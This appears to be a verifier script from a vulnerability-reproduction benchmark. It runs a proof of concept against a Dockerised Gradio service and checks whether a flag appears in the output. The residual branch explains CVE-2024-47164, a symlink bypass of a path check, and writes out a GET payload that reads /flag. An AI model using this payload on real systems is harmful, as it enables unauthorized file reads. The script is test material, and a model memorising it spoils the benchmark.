#!/usr/bin/env bash
# verify.sh --seed|--residual — 0=效果发生(flag出现) 10=未发生 20=环境失败 30=参数错误
# seed 路径：poc/seed_exec.py <candidate.json> <version>（公开执行器）；residual 需 case 补实现。
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
PORT="$(CPORT="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
CPORT="${CPORT:-80}"
docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "$CPORT" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
export PCB_TARGET_PORT="${PORT:-}"
if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || "$PY" "$CASE_DIR/poc/original_poc.py" 2>/dev/null)"
  CAND="${CAND:-"{}"}"
  # 容错：非 JSON 输出（如纯路径字符串）包装成 {"path": ...}
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'path': s.strip(), 'to': s.strip(), 'payload': s.strip(), 'css': s.strip()}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
else
  # residual: CVE-2024-47164 — V1 (4.11.0) 的 is_in_or_equal 只查相对路径里是否含字面 `..`，
  # 但同一 sink 仍信任不解析 symlink 的 abspath()：allowed 目录内的 symlink escape -> /
  # 使 /file=/gradio_tmp/escape/flag 相对路径无 `..`、is_in_or_equal 通过，FileResponse
  # 沿 symlink 命中 allowed 目录外的 /flag（V1 上仍可达效果；V2 5.0.0 加 .resolve() 修复）。
  CAND='{"probe_id": "cve-2024-47164-symlink-bypass", "method": "GET", "path": "/file=/gradio_tmp/escape/flag"}'
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
fi
BODY="$(printf '%s' "$OUT" | "$PY" -c "import json,sys
try:
    d = json.load(sys.stdin)
    print(d.get('body') or d.get('fetched_body') or json.dumps(d, ensure_ascii=False))
except Exception:
    print('')" 2>/dev/null)"
echo "${BODY:0:500}"
if grep -q "$RUN_FLAG" <<<"$BODY"; then exit 0; else exit 10; fi
